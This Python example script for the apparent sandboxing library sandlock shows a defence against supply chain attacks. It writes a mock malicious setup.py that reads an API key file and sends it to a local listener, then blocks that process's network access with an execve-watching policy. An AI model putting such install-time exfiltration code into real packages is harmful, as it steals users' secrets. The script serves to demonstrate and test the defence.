#!/usr/bin/env python3
# SPDX-License-Identifier: Apache-2.0
"""Supply chain attack defense with policy coroutines.

Simulates a real supply chain attack: an AI agent runs ``pip install``
which executes a malicious ``setup.py``.  The policy_fn detects the
setup.py in the execve argv and revokes network access before the
malicious code can exfiltrate data.

Run:
    python3 examples/supply_chain_defense.py
"""

from __future__ import annotations

import os
import socket
import sys
import tempfile
import threading

from sandlock import Sandbox, Policy


def main():
    # Local TCP server as the "attacker's exfil endpoint"
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("127.0.0.1", 0))
    srv.listen(1)
    port = srv.getsockname()[1]
    received = []

    def serve():
        while True:
            try:
                conn, _ = srv.accept()
                received.append(conn.recv(4096))
                conn.close()
            except OSError:
                break

    threading.Thread(target=serve, daemon=True).start()

    with tempfile.TemporaryDirectory(prefix="sandlock-demo-") as workspace:
        secret = os.path.join(workspace, "api_key.txt")
        with open(secret, "w") as f:
            f.write("sk-SUPER-SECRET-KEY")

        # Malicious setup.py — real Python, just like a real package
        setup_py = os.path.join(workspace, "setup.py")
        with open(setup_py, "w") as f:
            f.write(f"""\
import socket, sys
secret = open("{secret}").read()
try:
    s = socket.create_connection(("127.0.0.1", {port}), timeout=2)
    s.sendall(secret.encode())
    s.close()
    print("[setup.py] EXFILTRATED " + secret)
except OSError as e:
    print(f"[setup.py] BLOCKED: {{e}}")
""")

        # Agent runs "python3 setup.py" — same as pip does
        agent_py = os.path.join(workspace, "agent.py")
        with open(agent_py, "w") as f:
            f.write(f"""\
import subprocess, sys
print("[agent] running pip install (setup.py)...")
subprocess.run([sys.executable, "{setup_py}"])
print("[agent] done")
""")

        python_paths = [p for p in sys.path if p and os.path.isdir(p)]
        policy = Policy(
            fs_readable=["/usr", "/lib", "/lib64", "/bin",
                         "/etc", "/dev", "/tmp", workspace] + python_paths,
            fs_writable=[workspace, "/tmp"],
        )

        # --- Run 1: no defense ---
        print("=== Without policy_fn ===", flush=True)
        received.clear()
        with Sandbox(policy) as sb:
            sb.exec(["python3", agent_py])
            sb.wait(timeout=10)
        print(f"Secret leaked: {bool(received)}\n", flush=True)

        # --- Run 2: policy_fn detects setup.py in argv ---
        print("=== With policy_fn ===", flush=True)
        received.clear()

        async def install_guard(events, ctx):
            """Detect 'python3 setup.py' in execve argv, restrict that PID.

            Uses restrict_pid() so only the setup.py process and its
            children (e.g. nc, curl) lose network access.  The parent
            agent keeps full permissions.
            """
            async for e in events:
                if e.syscall == "execve" and e.argv:
                    for arg in e.argv:
                        if arg.endswith("setup.py"):
                            print(f"[policy_fn] PID {e.pid} "
                                  f"argv={list(e.argv)}"
                                  " — restricting", flush=True)
                            ctx.restrict_pid(e.pid,
                                             allowed_ips=frozenset())
                            break

        with Sandbox(policy, policy_fn=install_guard) as sb:
            sb.exec(["python3", agent_py])
            sb.wait(timeout=10)
        print(f"Secret leaked: {bool(received)}", flush=True)

    srv.close()


if __name__ == "__main__":
    main()
